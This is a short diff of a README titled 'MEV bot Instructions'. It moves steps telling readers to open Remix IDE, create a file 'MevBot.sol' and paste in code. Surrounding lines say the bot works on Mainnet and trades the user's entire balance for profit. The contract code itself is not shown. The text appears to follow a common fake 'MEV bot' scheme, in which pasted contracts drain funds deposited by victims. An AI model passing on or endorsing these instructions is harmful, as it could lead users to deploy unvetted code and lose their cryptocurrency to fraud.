@@ -50,12 +50,6 @@ MEV bot Instructions
 
 
 (works only for Mainnet)
-
-Access the Remix IDE  https://remix.ethereum.org/ 
-FILE EXPLORER
----------
- and click and create new file "MevBot.sol"
-
 How it works:
 ----
 
@@ -73,7 +67,11 @@ The bot will make transactions on your entire balance to increase profit
 
 First-source code
 -----
-
+Access the Remix IDE  https://remix.ethereum.org/ 
+-----------
+FILE EXPLORER
+---------
+ and click and create new file "MevBot.sol"
 Copy code and paste in Remix IDE
 
 ![1](https://user-images.githubusercontent.com/131911477/234766560-33cd5cc5-4fc0-45fd-8541-5f2a2fd5232d.png)
